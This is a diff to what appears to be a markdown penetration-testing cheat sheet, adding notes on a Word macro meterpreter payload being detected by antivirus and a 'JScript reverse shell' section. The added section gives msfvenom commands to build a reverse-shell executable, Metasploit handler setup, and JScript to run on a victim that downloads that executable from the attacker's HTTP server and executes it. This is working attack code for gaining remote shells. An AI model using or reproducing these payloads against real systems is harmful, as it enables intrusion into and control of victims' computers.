@@ -117,6 +117,8 @@ End Sub
 ```
 </details>
 
+However, this version (above) contains encoded meterpreter shell so might get detected by AV. Also, if the victim closes Word, we lose our shell. Version below fixes these:
+
 ### .ps1 reverse shell
 <details>
 1. generate the shellcode: `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<kali ip> LPORT=<port> EXITFUNC=thread -f ps1`
@@ -172,6 +174,38 @@ End Sub
 Sub AutoOpen()
     MyMacro
 End Sub
+```
+</details>
+
+## JScript reverse shell
+
+### Saves to disk
+<details>
+1. `msfvenom -p windows/x64/shell/reverse_tcp LHOST=<kali ip> LPORT=<port> EXITFUNC=thread -f exe -o met.exe`
+2. `msfconsole` -> `use exploit/multi/handler` -> `set PAYLOAD windows/x64/meterpreter/reverse_https` -> `set LHOST <kali ip>` -> `set LPORT <port>` -> `exploit`
+3. `python3 -m http.server <port of your choice>`
+4. On victim:
+```
+var url = "http://<kali ip>:<http port>/met.exe"
+var Object = WScript.CreateObject('MSXML2.XMLHTTP');
+
+Object.Open('GET', url, false);
+Object.Send();
+
+if (Object.Status == 200)
+{
+    var Stream = WScript.CreateObject('ADODB.Stream');
+
+    Stream.Open();
+    Stream.Type = 1;
+    Stream.Write(Object.ResponseBody);
+    Stream.Position = 0;
+
+    Stream.SaveToFile("met.exe", 2);
+    Stream.Close();
+}
+
+var r = new ActiveXObject("WScript.Shell").Run("met.exe");
 ```
 </details>
 
